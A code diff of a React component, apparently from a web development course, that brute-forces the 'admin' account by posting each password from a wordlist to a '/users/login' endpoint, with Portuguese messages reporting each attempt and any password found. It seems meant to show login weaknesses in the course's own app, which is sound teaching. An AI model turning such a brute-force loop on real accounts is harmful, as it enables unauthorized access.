@@ -1,42 +1,38 @@
-import React, { useEffect } from 'react'
+import React from 'react'
 import wordlist from '../data/wordlist'
 import myfetch from '../lib/myfetch'
 
+let stop = false
+
 export default function BruteForce() {
   const [log, setLog] = React.useState([])
-  const [stop, setStop] = React.useState(true)
 
-  async function handleStartClick() {
-    for(let i = 0; i < wordlist.length; i++) {
-      try {
-        if(stop) break
-
-        const logCopy = [ ...log ]
-        logCopy.unshift({
-          num: i,
-          text: `Tentativa nº ${i} => ${wordlist[i]}`
-        })
-        setLog(logCopy)
-
-        const result = await myfetch.post('/login', {
-          username: 'admin',
-          password: wordlist[i]
-        })
-        console.log(result)
-        alert('SENHA ENCONTRADA: ' + wordlist[i])
-        break
-      }
-      catch(error) {
-        // Não faz nada
-      }
+  async function tryPassword(password) {
+    try {
+      await myfetch.post('/users/login', { username: 'admin', password })
+      return 'OK'
+    }
+    catch (error) {
+      return error.message
     }
   }
-
-  useEffect(() => {
-    if(stop === false){
-        handleStartClick()
+  
+  async function handleStartClick(event) {
+    event.target.disabled = true
+    stop = false
+    for(let i = 0; i < wordlist.length; i++) {
+      if(stop) break
+      let result = await tryPassword(wordlist[i])
+      if(result === 'OK') {
+        setLog(`SENHA ENCONTRADA, tentativa nº ${i}: ${wordlist[i]}` )
+        break
+      }
+      else {
+        setLog(`Tentativa nº ${i} (${wordlist[i]}) => ${result}`)
+      }
     }
-  }, [stop])
+    event.target.disabled = false
+  }
 
   return (
     <>
@@ -45,19 +41,15 @@ export default function BruteForce() {
         display: 'flex',
         justifyContent: 'space-around'
       }}>
-        <button onClick={() => {setStop(false), handleStartClick}}>
+        <button onClick={handleStartClick}>
           Iniciar
         </button>
-        <button onClick={() => setStop(true)}>
+        <button onClick={() => stop = true}>
           Parar
         </button>
-        <select size="8">
-          {
-            log.map(row => (
-              <option key={row.num} value={row.text}>{row.text}</option>
-            ))
-          }
-        </select>
+      </div>
+      <div style={{ fontFamily: 'monospace' }}>
+        {log}
       </div>
     </>
   )
